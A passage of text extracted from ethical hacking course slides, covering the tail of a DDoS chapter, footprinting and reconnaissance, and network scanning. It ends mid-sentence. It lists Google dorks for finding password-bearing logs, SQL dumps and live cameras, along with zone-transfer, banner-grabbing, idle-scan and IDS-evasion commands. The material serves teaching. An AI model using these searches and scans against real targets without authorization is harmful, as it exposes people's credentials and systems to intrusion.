services\nIncrease bandwidth for all critical connections\nFilter traffic on upstream routers and Rate-limit allowed connections \nEnsure software/protocols are up-to-date\nDisable all insecure/unused services\nEnsure kernel is kept up-to-date\nEnsure firewall is configured to deny access by external ICMP traffic\nEnsure input validation is performed\nCloud Based DDoS Protection \nMost ISPs block all requests  during DDoS attack\nUnfortunately denies  legitimate traffic\nIn-cloud DDoS protection\nDuring an attack all attack  traffic is redirected to the  provider\nIt is filtered and returned\nCloud-based solutions\nCloudflare\nNetscout\n\n\n23\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\PDF Presentation\\Chapter-3Footprinting.pdf": "Chapter-3\nFootprinting and \nReconnaissance \nTopics\n•\nFootprinting Concepts\n•\nFootprinting through Search Engines, Web Services, Social \nNetworking Sites\n•\nSocial Engineering- Computer Based and Human Based\n•\nWebsite Footprinting\n•\nEmail Footprinting\n•\nWhois Footprinting\n•\nDNS Footprinting\n•\nNetwork Footprinting\n•\nFootprinting Tools\n•\nFootprinting countermeasures\nFootprinting\n• Footprinting, refers to the systematic process of gathering \ninformation about a target network, system, organization, or \nindividual with the intent of identifying potential \nvulnerabilities and weaknesses. \n• This information is often collected through various passive \nand active reconnaissance techniques, without actually \nexploiting any vulnerabilities. \n• Footprinting is a crucial initial phase in the hacking process, \nproviding hackers with a detailed understanding of their \ntarget and serving as a foundation for planning and launching \ncyberattacks.\nActive Footprinting:\nDefinition:\n•\nActive footprinting involves direct interaction with the target \nto gather information, such as probing open ports, \nperforming vulnerability scans, or engaging with services.\nCharacteristics:\n•\nIt's more intrusive as it actively sends requests or probes to \nthe target.\n•\nTypically involves scanning, probing, or querying target \nsystems.\n•\nMay generate network traffic and logs on the target, \npotentially raising alerts.\nOutput:\n•\nProvides specific and real-time information about the \ntarget's current state.\n•\nReveals open ports, services, and potential vulnerabilities.\n•\nMay trigger responses that can aid in OS or service \nidentification.\nTools and Techniques:\n•\nPort scanning, banner grabbing, vulnerability scanning, \nICMP probing, DNS zone transfers, SMTP enumeration, \nSNMP enumeration, SMB enumeration, and more.\nPurpose:\n•\nActive footprinting is used to identify immediate \nweaknesses and vulnerabilities in the target.\n•\nHelps in the preparation of specific attacks by revealing \npotential entry points and misconfigurations.\nPassive Footprinting:\nDefinition:\n•\nPassive footprinting involves the collection of information \nwithout directly interacting with the target. It relies on \npublicly available data and observed behaviors.\nCharacteristics:\n•\nNon-intrusive and stealthy; doesn't involve direct \ncommunication with the target.\n•\nGathers information from publicly accessible sources, \nsuch as websites, social media, news articles, and public \nrecords.\nOutput:\n•\nProvides historical and pre-existing information about the \ntarget.\n•\nGathers data such as domain names, IP addresses, contact \ndetails, employee names, and affiliations.\n•\nOften used for reconnaissance before active footprinting.\nTools and Techniques:\n•\nSearch engines, social media monitoring, web scraping, \nDNS queries, online databases, and open-source \nintelligence (OSINT) tools.\nPurpose:\n•\nPassive footprinting establishes a baseline understanding \nof the target's digital presence and public information.\n•\nAids in identifying potential attack vectors, targets, and \nareas for further investigation during active footprinting.\nActive Footprinting concepts \n• Port Scanning:\n• Definition: Port scanning involves scanning a target system's network ports to determine which \nports are open and potentially vulnerable to attack.\n• Expected Output: A list of open ports and their associated services.\n• Tools: Nmap, Masscan, Zenmap.\n• Banner Grabbing(Web Application\\Database):\n• Definition: Banner grabbing is the process of connecting to open ports and capturing banners or \nservice information that reveals software versions and configurations.\n• Expected Output: Information about the services running on open ports, including version \nnumbers.\n• Tools: Telnet, Netcat, Nmap.\n• OS Fingerprinting:\n• Definition: OS fingerprinting is the attempt to identify the operating system running on a target \nhost by analyzing its responses to network probes.\n• Expected Output: Information about the target's operating system.\n• Tools: Nmap, P0f, Xprobe2.\n•\nVulnerability Scanning:\n•\nDefinition: Vulnerability scanning involves using specialized tools to scan for known vulnerabilities in \nthe target's software, services, and configurations.\n•\nExpected Output: A report listing identified vulnerabilities and their severity.\n•\nTools: Nessus, OpenVAS, Qualys.\n•\nPing Sweeping:\n•\nDefinition: Ping sweeping is the process of sending ICMP (Internet Control Message Protocol) echo \nrequests to a range of IP addresses to determine which hosts are online.\n•\nExpected Output: A list of live hosts within the specified IP range.\n•\nTools: Ping, fping, Nmap.\n•\nTraceroute:\n•\nDefinition: Traceroute traces the path that network packets take from the source to the target, revealing \nthe intermediate routers and network devices.\n•\nExpected Output: A list of routers and their IP addresses along the network path.\n•\nTools: Traceroute, MTR (My Traceroute), PathPing.\n•\nDNS Enumeration:\n•\nDefinition: DNS enumeration involves querying DNS servers to gather information about a target's \ndomain names, subdomains, and DNS records.\n•\nExpected Output: A list of domain names, subdomains, and associated IP addresses.\n•\nTools: nslookup, dig, dnsrecon.\nPassive Footprinting concepts \n• Google Hacking:\n•\nDefinition: Using advanced search queries in search engines like Google to discover sensitive or hidden \ninformation.\n•\nExpected Output: Information about vulnerable systems, login pages, exposed directories, and more.\n•\nTools/Websites: Google Dorks, Google Hacking Database (GHDB).\n• Email Harvesting:\n•\nDefinition: Collecting email addresses associated with the target.\n•\nExpected Output: Lists of email addresses related to the organization or individuals.\n•\nTools/Websites: TheHarvester, Hunter.io, Email finding extensions.\n• WHOIS Lookup:\n•\nDefinition: Retrieving domain registration information.\n•\nExpected Output: Domain owner's name, contact information, registration date, and more.\n•\nTools/Websites: WHOIS lookup tools, registrar websites.\n• Metadata Analysis:\n•\nDefinition: Extracting metadata from files (e.g., documents, images) to reveal hidden information.\n•\nExpected Output: Author names, software used, document history, geolocation data.\n•\nTools/Websites: ExifTool, online metadata analyzers.\n• Robot.txt Analysis:\n•\nDefinition: Checking the robots.txt file on websites for information about restricted or allowed content.\n•\nExpected Output: URLs disallowed for web crawlers, revealing potentially sensitive areas.\n•\nTools/Websites: Manually inspecting robots.txt, web crawler tools.\n• Archive Sites:\n•\nDefinition: Searching archived versions of websites to access historical data.\n•\nExpected Output: Historical content, design changes, and previous site configurations.\n•\nTools/Websites: Archive.org, archive.is, web archive search engines.\n•  Search Engine Cache:\n•\nDefinition: Accessing cached versions of web pages to retrieve historical data.\n•\nExpected Output: Previous versions of web pages, content changes over time.\n•\nTools/Websites: Google Cache, Wayback Machine.\n• Social Media Profiling:\n•\nDefinition: Analyzing an organization's or individual's presence on social media platforms.\n•\nExpected Output: Information about employees, organizational structure, interests, and connections.\n•\nTools/Websites: Social media platforms (LinkedIn, Facebook, Twitter), OSINT tools.\nFootprinting through search engines- Google Hacking\n§The use of specialized Google searches\n§Find unusual information such as:\n§ Sites that may link back to target’s website\n§ Information about partners, vendors, suppliers, clients, etc.\n§ Error messages that contain sensitive information\n§ Files that contain passwords\n§ Sensitive directories\n§ Pages that contain hidden login portals\n§ Advisories and server vulnerabilities\n§ Software version information\n§ Web app source code\n§ Using search strings with\nadvanced operators\n§ Find information not\nreadily available on a\nwebsite\n§ Can be used to find\nvulnerabilities, files\ncontaining passwords, \nlists of emails, log files,\nlive camera feeds, and \nmuch more\n§ Considered an easy way \nof hacking\nOperator\nDescription\nExample\nintitle:\nfind strings in the title of a page\nintitle:”Your Text”\nallintext:\nfind all terms in the title of a page\nallintext:”Contact”\ninurl:\nfind strings in the URL of a page\ninurl:”news.php?id=”\nsite:\nrestrict a search to a particular site or\ndomain\nsite:yeahhub.com\n“Keyword”\nfiletype:\nfind specific types of files (doc, pdf, mp3 etc)\nbased on file extension\nfiletype:pdf “Cryptography”\nlink:\nsearch for all links to a site or URL\nlink:”example.com”\ncache:\ndisplay Google’s cached copy of a page\ncache:yeahhub.com\ninfo:\ndisplay summary information about a page\ninfo:www.example.com\n§ Camera feeds – live feeds from AXIS cameras\n§ intitle:\"Live View / - AXIS\" | inurl:/mjpg/video.mjpg?timestamp\n§ Email lists contained in Excel files\n§ filetype:xls inurl:\"email.xls\"\n§ Log files containing passwords and corresponding emails\n§ filetype:log intext:password intext:(@gmail.com | @yahoo.com | @hotmail.com)\n§ Open FTP Servers that can contain sensitive information\n§ intext:\"index of\" inurl:ftp\n§ Return results that match “accounting” from target.com, but NOT from marketing.target.com\n§ site:target.com -site:marketing.target.com accounting\n§ Pages vulnerable to SQL injection attacks\n§ inurl:\".php?id=\" intext:(error AND sql)\n§ Scanning reports – vulnerabilities in scanned systems\n§ intitle:report (nessus | qualys) filetype:pdf\n§ SQL Database – contents of exposed databases, including usernames and passwords\n§ intitle:\"index of\" \"dump.sql\"\n§List of popular Google Dorks\nhttps://www.exploit-db.com/google-hacking-database/\nFootprinting Through Social Networking Sites\n§ Attackers use social networking sites to gain important and sensitive data \nabout their target\n§ They often create fake profiles through these social media\n§ Aim is to lure their target and extract vulnerable information\n§ Employees may post :\n§ Personal information such as DOB, educational and employment background,\nspouse’s names, etc.\n§ Information about their company such as potential clients and business partners, \ntrade secrets of business, websites,company’s upcoming news, mergers,\nacquisitions,etc.\n§ Common social networking sites used:\n§ Facebook, MySpace, LinkedIn,Twitter,Pinterest,Google+,YouTube, Instagram\n§ Present activity/physical location\n§ Job activities\n§ Company information\n§ Contact details, names, numbers,addresses, date of birth,\nphotos\n§ Family & friends\n§ Property information\n§ Bank details\n§ Background and criminal checks\n§ A great source of personal and organizational \ninformation\n§ Residential addresses, email addresses, phone\nnumber\n§ Satellite photos of residences\n§ Date of birth\n§ Photos and social networking profiles\n§ Friends/family/associates\n§ Hobbies/current activities/blogs\n§ Work information\n§ Projects and operating environment\n§ Travel details\nPeople Search Sites\n§ CheckPeople\n§ BeenVerified\n§ Truthfinder\n§ peopleWhiz\n§ PeopleLooker\n§ Intelius\n§ Checkmate\n§ Peoplefinders\n§ IDtrue\nSocial Engineering- Computer Based and Human Based\nHuman-Based Social Engineering: In human-based social engineering, the primary manipulator \nis a real person who interacts directly with the target. This can involve in-person communication, \nphone calls, or other forms of direct human interaction.\n•\nThis approach typically relies on social skills, persuasion, and the ability to build rapport with \nthe target. Manipulators may use techniques like pretexting (creating a fabricated scenario), \nimpersonation, or tailgating (following an authorized person into a secure area) to achieve their \ngoals.\n•\nThis approach is often more resource-intensive and may target a smaller number of individuals \ndue to the need for direct interaction.\nComputer-Based Social Engineering: Computer-based social engineering relies on automated \nor scripted methods, often using digital communication channels like email, messaging apps, or \nsocial media. There is no direct human interaction involved; instead, the manipulation is carried \nout through written or automated messages. \n•\nThis approach relies on written communication and the use of psychological tactics to trick the \ntarget. Common methods include phishing (sending deceptive emails to trick recipients into \ntaking action), baiting (enticing targets to download malicious files), and pretexting through \ndigital channels.\n•\nIt can be automated to reach a larger audience, making it possible to target a larger number of \npotential victims simultaneously.\n§ Collect names, job titles,personal information,contact information,\nemail addresses, etc.\n§ Remember: at this stage you want to be subtle and go unnoticed\n§ Techniques include:\n§ Casual face-to-face contact\n§ Trade show or public event\n§ Eavesdropping\n§ Shoulder surfing\n§ Dumpster diving\n§ Impersonation on social networking sites\nWebsite Footprinting\nWebsite Footprinting, also known as web reconnaissance or information gathering, is the process of collecting \ninformation about a website, its infrastructure, and the associated web resources. \n§ Monitoring and analyzing the target’s website for information\n§ Browse the target website\n§ Use Burp Suite,Zaproxy,Paros Proxy,Website Informer,Firebug, etc. to determine:\n§ Connection status and content-type\n§ Accept-Ranges and Last-Modified information\n§ X-Powered-By information\n§ Web server version\n§ Examine HTML sources\n§ Examining cookies\n§ Use OSINT to discover additional information about a website\n§ Identify personnel, hostnames, domain names, and useful data residing on exposed web \nservers\n§ Search Google, Netcraft, Shodan, LinkedIn, PGP key servers, and other sites\n§ Search known domain names and IP blocks\n§ Searches Google’s cache\n§ Looks for vulnerabilities,errors,\nconfiguration issues, proprietary\ninformation,and interesting security\nnuggets on web sites\n§ Use it to find information that can be\nexposed through Google Dorking\n§ Web content scanner\n§ Looks for existing and hidden web objects\n§ Useful for finding hidden subdirectories in a\nweb app\n§ Works by launching a dictionary based attack \nagainst a web server\n§ Analyzes the response\n• Website Ripper\nCopier\n•  Offline Explorer\nEnterprise\n• Archive.org\n• WebWatcher\n§ Allows access to archived versions\nof the website\n§ Copies the site as it was at the time\n§ You can find information that was\nsubsequently deleted\n§ Archived sites may or may not\ninclude original downloads\n§ Also contains extensive content\nuploaded by the community\n§ Download an entire copy of the website to a local\ndirectory\n§ You can examine the entire website offline\n§ Helps gather information without making website\nrequests that could be detected\n§ You can take your time searching\n§ Need to copy slowly\n§TOOLS\n§ HTTrack Web Site\nC opier\n§ SurfOffline\n§ Teleport Pro\n§ Portable Offline Browser\nEmail Footprinting\n§Email Source Header\n§ Reading the email source header can\nreveal:\n§ Address from which the message was sent\n§ Sender’s mail server\n§ Authentication system used by sender’s mail\nserver\n§ Date and time of message\n§ Sender’s name\n§ Also reveals:\n§ Spoofed info\n§ Bogus links and phishing techniques\n§ Tracking Email can reveal\n§ Recipient IP address\n§ Geolocation\n§ Email received and read\n§ Read duration\n§ Proxy detection\n§ Links\n§ OS and Browser info\n§ Forwarded email\n§ Recipient device type\nTools\n§ EmailTrackerPro \n§ PoliteMail\n§ Yesware\n§ ContactMonkey\n§ Zendio\n§ ReadNotify\n§ DidTheyReadit\n§ A widely-used query and response protocol\n§ Used to query databases that store the registered users or assignees of an \nInternet resource such as:\n§ Domain names\n§ IP address blocks\n§ Autonomous system numbers\n§ The protocol stores and delivers database content in a human-readable\nformat\n§ It is widely available for publicly available for use\nSource:domainnamestat.com\n§ WHOIS databases are maintained by Regional \nInternet Registries and hold personal \ninformation of domain owners\n§ WHOIS query\n§ Domain name and details\n§ Owner information\n§ DNS servers\n§ Network Blocks\n§ Autonomous System Numbers\n§ When created\n§ Expiry\n§ Last update\n§ Can aid attacker or ethical hacker with social\nengineering\nPopular WHOIS Lookup Tools\n§ whois.com\n§ Domainnamestat.com\n§ LanWhoIs\n§ Batch IP Converter\n§ CallerIP\n§ WhoIs Lookup Multiple Addresses\n§ WhoIs Analyzer Pro\n§ HotWhoIs\n§ ActiveWhoIs\n§ WhoisThisDomain\n§ Attackers use DNS data to find key hosts on \nthe target’s network\n§ DNS record types:\n§ A – IPv4 host address\n§ AAAA - IPv6 host address\n§ MX – mail server\n§ NS – name server\n§ CNAME – alias\n§ SOA – authority for domain\n§ SRV – service records\n§ PTR – maps IP Address to hostname\n§ RP – responsible person\n§ HINFO – Host information record (CPU type/OS)\n§ TXT – Unstructured text record\nDNS Footprinting\nDNS Query Tools\n§ Nslookup\n§ dig\n§ host\n§ whatsmydns.net\n§ myDNSTools\n§ Professional Toolset\nnslookup www.hackthissite.org\nServer: \nAddress:\n192.168.63.2\n192.168.63.253\nNon-authoritative answer:\nName: www.hackthissite.org Address:137.74.187.103\nName: www.hackthissite.org Address:137.74.187.102\ndig www.example.com\ndig @8.8.8.8 www.example.com A dig \n+short www.example.com A dig\nexample.com txt\ndig example.com cname \ndig example.com ns dig\nexample.com MX\ndig axfr zonetransfer.me @nsztm1.digi.ninja.\nNetwork Footprinting\n$ host -t a github.io\ngithub.io has address 185.199.109.153\n$ whois 185.199.109.153\ninetnum:\nnetname:\ncountry:\n185.199.108.0 - 185.199.111.255\nUS-GITHUB-20170413  \nUS\n$ curl -s https://networksdb.io/ip-addresses-of/github-inc | grep 'IP Range' | awk '{print\n$3\" - \"$5}' | sort\n140.82.112.0 - 140.82.127.255\n148.62.46.150 - 148.62.46.151\n§ Discover routers and firewalls along the path to a target\n§ Uses ICMP or UDP with an increasing TTL to elicit router identification\n§ Find the IP address of the target firewall\n§ Help map the target network\n§ https://www.monitis.com/traceroute/\n§ https://centralops.net/co/\n§ Recognize that once information is on the Internet,it might never fully\ndisappear\n§ Perform OSINT on yourself regularly to see what’s out there\n§ Identify information that might be harmful\n§ When possible, go to the sites that publish that information and remove\nit\n§ Delete/deactivate unnecessary social media profiles\n§ Use an identity protection service\n§ Use Shodan and Google Dorks to search for exposed files and\ndevices\n§ If any are discovered, implement protective measures\nFootprinting Countermeasures\n§ Set up a monitoring service such as Google Alerts to notify you if new \ninformation appears\n§ Train yourself (and your employees) to recognize the danger and\nbe cautious about what they share on social media\n§ If possible, use a data protection solution to minimize data \nleakage from the company\n§ Turn off tracking features on your phone and configure privacy\nsettings\n§ Disable location on photos you plan to post publicly on social media\n§ Remove metadata from images if you don’t want others to know which\ndevice you are using to capture\nFootprinting Countermeasures(cont’d)\n37\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\PDF Presentation\\Chapter-4Scanning.pdf": "Chapter -4 \nScanning\nTopics Covered\n• Scanning Networks\n• Network Scanning Concepts\n• Scanning Tools\n• Host Discovery\n• Port and Service Discovery\n• OS Discovery (Banner Grabbing / OS Fingerprinting)\n• Scanning beyond IDS/Firewall\nScanning Networks\n• Search the network for potential targets to \n§ Discover live hosts\n§ Discover services and listening ports\n§ Fingerprint OSes and services\n§ Identify targets for a vulnerability scan\n• Fingerprinting: identifying an OS or service version through actively \nengaging the target\n• The goal of scanning is to ultimately find vulnerable targets that you \ncan exploit!\n§ Can be:\n§ Active (engage the target for information)\n§ Passive (sniff traffic for information)\nAnd……\n§ Discovery Scan\n§ Find potential targets\n§ Port Scan\n§ See what services hosts are running\n§ Vulnerability Scan\n§ See if those services are vulnerable to hacking\n§ Other Scans\n§ Map hostnames - IP addresses - MAC addresses\n§ Identify additional supported protocols\n§ Stealthy alternatives to port scans\nNetwork Scanning Tasks\nTask\nDescription\nCheck for live systems\nPing or ARP to discover live hosts\nCheck for open ports\nScan live IPs for listening ports\nEvade IDS and Firewalls\nIf necessary, evade detection using\nproxies, spoofing, fragmented packets,\netc.\nPerform banner grabbing\nGrab from servers\nPerform OS and service fingerprinting\nScan for vulnerabilities\nTest services and OSes for vulnerabilities\nDraw network diagrams\nShow logical and physical pathways into\nnetworks\nPentest Report\nDocument everything that you find\nIdentify next steps for exploiting vulnerabilities\n§ IPv6 addresses are 128 bits\n§ Traditional scanning techniques are not feasible because of the larger \nsearch space (64 bits)\n§ Some scanning tools do not support scanning IPv6 networks\n§ Attackers may gather IPv6 addresses from:\n§ network traffic\n§ recorded logs\n§ header lines in archived emails\n§ Usenet news messages\n§ If an attacker does discover and compromise one host:\n§ They can probe the “all hosts” link local multicast address FF01::1\n§ Discover additional targets on the link\n§ You take a typical IP/ICMP/TCP/UDP packet and:\n1. Specify what settings or values should be in the header fields or payload\n2. Send the packet to the target\n3. See how the target responds to“illegal” or unexpected packet settings\n§ Different OSes respond in different ways\n§ You can often identify the OS based on the response:\n§ IP - TTL,Don’t Fragment (DF) flag / Don’t Fragment ICMP (DFI)\n§ TCP - Starting window size, Explicit congestion notification (ECN) flag\n§ Sequence number generation\n§ ICMP - echo request / echo reply padding\n§ Tools\n§ -Nmap  -Hping3  -Colasoft   -NetScan Tools Pro     -Cat Karat\nAdvanced Scanning using crafted Packets\nICMP Discovery Scans\nICMP - Internet Control Messaging Protocol(Used in PING Command)\n§ Layer 3 protocol\n§ Direct payload of IP\n§ Protocol ID 1\n§ Has message types\n§ Each message type in turn may have codes for further information\nWhat is a Discovery Scan?\n•\nA type of scan that discovers live IP addresses on a network\n•\nA Ping Sweep is the simplest network scanning method\n•\nIt uses ICMP ECHO REQUEST packets to search for live hosts\n•\nFew discovery scans use ARP instead of ICMP to bypass host-based\nfirewalls\n•\nCan also use specially crafted TCP or UDP packets\n§ The easiest protocol to use to scan for live systems\n§ Scanner sends ICMP ECHO requests to one or more IP addresses\n§ If live, hosts will return an ICMP ECHO REPLY\n§ Useful for locating local devices\n§ Often blocked by:\n§ Software firewall on the host\n§ Packet filtering router/firewall between the scanner and target network\n§ Useful for determining if a firewall is permitting ICMP\n§ Example:\n§ ICMP Echo returns Type 3 Code of 13“Destination unreachable administratively\nprohibited”\n§ This type of message is typically returned from a device blocking a port\n§ Indicates a firewall that was poorly configured - the firewall should send no response at all\n§ Use ARP requests/replies to discover live hosts\n§ Cannot be blocked by a personal firewall\n§ ARP is required to discover MAC addresses and map them to IP\naddresses\n§ Used on an Ethernet orWi-Fi LAN\n§ Tools include:\n§ Nmap\n§ Ettercap\n§ Metasploit\n§ Cain & Abel\nPORT Scans\n§ What is a PORT\n§ A number (0 - 65535) that represents a process on a network\n§ Well-known services use specific port numbers by convention\n§ Both TCP and UDP use port numbers\n§ Source and destination each have a port\n§ Embedded in the header\n§ Indicates the payload\n§ A client and server will each have its own port in a conversation\n§ Usually not the same port\n§ Some services are only “loosely bound” to a port\n§ It is possible for another process to“get in front of” that service\n§ Take over the port\n§ This happens in hacking\n§ Example: netcat getting in front of IIS\n§ Intercepts and redirects web traffic\n§ Well-known ports(ports - 0 – 1023,      NOTE:- 0 is not used)\n§ Reserved by convention for well-known services\n•\nServer listens on well-known port for incoming connection attempts\n•\nClient process, identified by its own port, attempts to make a connection\n•\nThe server can accept or reject the connection attempt\n§\nUsually based on if there is a listening service on that port\n§\nCan also have firewall filtering or other policies that block connections from specific clients\n§ Registered(ports - 1024 – 49151)\n§ Services can additionally request the use of these ports from the operating\nsystem\n§ Dynamic(ports - 49152 – 65535)\n§ Operating system temporarily assigns a dynamic port to a client process\n§ The port is“returned” to the OS when the client process ends\nCommon Port Numbers and Services\nPort Numbers\n(TCP, unless\nnoted)\nService\n21\nFTP commands\n22\nSSH\n23\nTelnet\n25\nSMTP\n53 (TCP or \nUDP)\nDNS\n80\nHTTP\n88\nKerberos\n110\nPOP3\n111 (TCP or \nUDP)\n*nix portmapper\nPort Numbers (TCP,\nunless noted)\nService\n135\nMicrosoft Remote\nProcedure Call (RPC)\n139\nSMB (legacy)\n143\nIMAP4\n161\n(TCP or UDP;only UDP is\nused at this time)\nSNMP\n162\n(TCP or UDP; only UDP is\nused at this time)\nSNMP traps\n389\nLDAP\n443\nHTTPS\n445\nMicrosoft-ds (authentication\nused by SMB)\n3389\nRDP\nScanning for Open Ports\n§ Look for open TCP or UDP ports\n§ An open port indicates a listening service\n§ Might have exploitable vulnerabilities\n§ TCP and UDP respond differently to scans\n§What is a TCP PORT SCAN\n§ The most common type of port scan\n§ Attacker sends TCP packets to the target\n§ Various TCP header flags are raised (bit set to 1)\n§ Response can indicate:\n§ Listening service\n§ OS version\n§ Firewall settings etc.\nFlag\nName\nFunction\nSYN\nSynchronize\nSet during initial communication Negotiate parameters and\nsequence numbers\nACK\nAcknowledgment\nSet as an acknowledgement to the SYN flag. Always set after\ninitial SYN\nRST\nReset\nForces the termination of a connection (in both directions)\nFIN\nFinish\nPart of the close session handshake\nPSH\nPush\nForces the delivery of data without concern for buffering\nURG\nUrgent\nData inside is being sent out of band. Example is cancelling a\nmessage\nTCP \nHEADER\n§ SYN -\nSYN-ACK - ACK\n§ Establish session\n§ Set starting sequence numbers\nTCP 3-Way Handshake\n§ FIN-ACK - FIN-ACK\n§ Properly end a session\n§ Both sides FIN and ACK the other\nTCP 4-Way Goodbye Handshake\n§ Most common type of port scan\n§ aka Stealth Scan or Half-Open Scan\n§ Client sends SYN packet to server\n§ Server responds with SYN/ACK packet\n§ Server responds with RST packet and remote port is closed\n§ Client sends RST packet to close the initiation before connection is\nestablished\n§ Resets TCP connection between client and server in midstream\n§ Connection is only “half open”\n§ AKA TCP Full Scan, or TCP Open Scan\n§ Completes the TCP three-way handshake\n§ Establishes a full connection\n§ Then tears it down by sending a RST packet\n§ Does not require super user privileges on Linux\n§ Appears “normal” to intrusion detection\n§ Least likely to rouse suspicion\n§ Used to determine if the host is protected by filtering/firewall\n§ Since (nearly) every TCP segment contains a raised ACK flag, an ACK scan\nappears normal\n§ Can evade IDS in most cases\n§ Can be used against packet filtering routers to see what’s behind it\n§ Attacker sends ACK probe packet with a random sequence number to target\n§ No response = protected (filtered) by firewall\n§ RST = port is closed\n§ TTL-based\n§ Send 1000s of ACKs to different TCP ports\n§ Analyze TTL field in RST packets received\n§ If boundary value < 64,then port is open, If greater than 64, then port is closed\n§ Window-based\n§ Send 1000s of ACKS to different TCP ports\n§ IfWINDOW value of RST received has non-zero value, then port is open\n§ Stealthier than a SYN scan\n§ Does not attempt to start a TCP connection\n§ Used to discover firewall rules / evade detection by IDS\n§ TCP flags are raised in an unusual / illegal pattern\n§ Types include:\n§ XMAS Scan (PSH, URG, FIN)\n§ Null Scan\n§ FIN Scan\n§ No handshake involved\n§ UDP is a stateless protocol\n§ You can send a UDP datagram\n§ You often won’t get a response\n§ UDP itself cannot determine if host is alive, dead or filtered\n§ Sometimes a UDP closed port will return an ICMP port unreachable\nmessage\n§AKA “blind” scan or“idle” scan\n§Map open ports on a remote system without producing any \nevidence that you have interacted with that system\n§Force target to interact with a third machine (zombie)\n§Check Zombie’s IPID to see if it incremented\n§ IP identification (IPID) identifies a packet in a communication session\n§ Its primary purpose is to recover from IP fragmentation\nStealth Option\nExample\nDescription\n-sI <zombie \ncandidate>\nnmap –sI \nserver.example.com\nFind a zombie\n•\nThe target is the zombie candidate\n-sI <zombie>\n<target>\nnmap -sI -Pn -p-\nzombie.example.com  \nwww.company.com\nConduct a blind TCP port scan (idle scan)\n•\nAssume the target is“up”\n•\nScan all TCP ports\n•\nUse the \"zombie\" (middle man) host to obtain information \nabout open ports on the target\n§ AKA OS fingerprinting\n§ A way to determine the operating system running on the remote target system\n§ Some services identify themselves when queried\n§ Error messages can reveal information about the service or OS\n§ You can use banner grabbing to identify the service and/or OS version\n§ Can also examine TCP and ICMP messages to identify OS\nActive Banner Grabbing\nPassive Banner Grabbing\n•\nSpecially constructed packets are sent to \nthe remote OS and responses are captured\n•\nError message provide information \nincluding type of server,type of OS,and  SSL\ntools used by target\n•\nResponses are compared with a database to\ndetermine the OS\n•\nSniffing network traffic on the target \nallows attacker to determine OS\n•\nResponse from different Oses vary \nbecause of differences in the TCP/IP \nstack\n•\nPage extensions in a URL may assist the \nattacker in determining versions\n§In TCP Layer\n§Window Size\n§ 0x7D78 (32120) = Linux\n§ Cisco & Microsoft constantly change\nIn IP Layer:\n§TTL\n§ 64 = Linux / FreeBSD\n§Don’t Fragment (DF) bit\n§ See if the DF (Don’t Fragment) bit is set(=1)\n§ SCO & OpenBSD do not use the DF flag\n§Type of Service (ToS)\n§ Indicates the protocol (priority) more than the OS\ntelnet <target IP> <port number>\nnc –vv <target IP> <port number>\necho -en \"GET / HTTP/1.0\\n\\n\\n\"|nc www.comptia.org 80|grep Server\nnmap\n-sV <target IP> -p <port number>\nnmap\n-sV --script=banner <target>\n§ A highly flexible open source\ntool for scanning networks\n§ C ommand-line based for Linux\nand Windows\nTool-1 Network Mapper(NMAP)\n§ZENMAP\n§ GUI version of NMAP\n§ Uses NMAP syntax\n§ C reated for Windows users\n§Command line network scanning\n§Packet crafting\n§Can perform various scan types\n§Used for:\n§ Host discovery\n§ Network security auditing\n§ Firewall testing\n§ Manual path MTU discovery\n§ Advanced traceroute\n§ Remote OS fingerprinting\n§ Remote uptime estimating\n§ TCP/IP stack auditing\nTool-2 HPING2/HPING3\nRaise TCP FIN Flag\nPacket Count\nDestination Port\nSource Port\nTarget responds with TCP RST and ACK\n§Each firewall configuration presents its own challenges to\nscanning\n§If you are scanning a network“black box” style you do\nnot know which, if any, firewall type you will encounter\n§If you can infer which type you’re encountering, this will give \nyou an advantage in a pentest\n§You’ll have a better idea of:\n§ Which techniques to not spend too much time on\n§ Other approaches you should consider to break into the network\nReported State\nDescription\nOpen\n•\nThis port is actively accepting TCP, UDP or SCTP connections \nOpen ports are the ones that are directly vulnerable to attacks \nThey show available services on a network.\nClosed\n•\nTarget responds (usually with RST) but there is no application \nlistening on that port\n•\nUseful for identifying that the host exists and for OS detection\nFiltered\n•\nNmap can’t determine if the port is open because the probe is being \nblocked by a firewall or router rules\n•\nUsually no response or“Destination unreachable”\nUnfiltered\n•\nPort is accessible but Nmap doesn’t know if its open or closed. Only \nused in ACK scan which is used to map firewall rulesets. Other scan\ntypes can be used to identify whether the port is open.\nOpen/filtered\n•\nNmap is unable to determine between open and filtered. \nThe port is open but gives no response.\n•\nNo response could mean that the probe was dropped by a packet \nfilter or any response is blocked.\nClosed/filtered\n•\nNmap is unable to determine whether port is closed or filtered \nOnly used in the IP ID idle scan\nTry to determine:\n§ The firewall rule set (allowed and blocked ports)\n§ Firewall type (stateful or stateless)\n§ Weaknesses in the firewall’s configuration\n§ Devices behind the firewall\n§The attacker splits the probe packets into several smaller\nfragments\n§ Then sends them to the target network\n§ The packet is then reassembled at the final destination\n§The IDS/Firewall processes each packet separately\n§ Doesn’t recognize that the packet is malicious\n§ The payload fragments are each too short to match a known signature\n§IDSes are often configured to skip fragmented packets during\nscanning\nTechnique\nPurpose\nACK Scan\n• Map out firewall rulesets\n• Determine if firewall is stateful or stateless\nSYN/FIN Scan\n• Sets both the SYN and FIN bits\n• A good way to bypass a rule that drops packets with ONLY SYN\nraised\n§A stateless firewall will be easier to get past than a stateful one\n§A stateless firewall will block SYN packets based on port number\n§ However, it is far less likely to block ACK packets because those could be a\nresponse to an outgoing connection\n§ Perform separate SYN and ACK scans against the same ports\n§ IF the SYN shows some ports open and some closed AND the ACK shows all \nports unfiltered, the firewall is likely stateless or disabled.\n§A stateful firewall will know from its state table if the ACK is\nlegitimate or not\n§ If an ACK scan shows at least some ports as “filtered” then it is likely a\nstateful firewall\n§Used to determine exactly which device permits/blocks a port\n§Good for probing past a firewall into an internal network\n§Can be used to probe past multiple daisy-chained firewalls\n§You can manipulate the IP TTL in a scan to distinguish between:\n§ A protected server that does not have that port open\n§ An intermediate firewall that blocks the port from being reached by the \nscanner\n§A firewall will return ICMP Type 11, Code 0 (Time Exceeded) if:\n§ The port is allowed\n§ The probe TTL expires at the firewall\n§ Probe must be sent to a live final target\n§ Does not matter if the final target actually listens on that port\n§ Nmap itself will report the port status as filtered\n§ It’s looking for a TCP response, not an ICMP response\n§ A firewalker will notice the ICMP response and report the port as permitted\n§ A proxy server is an intermediary 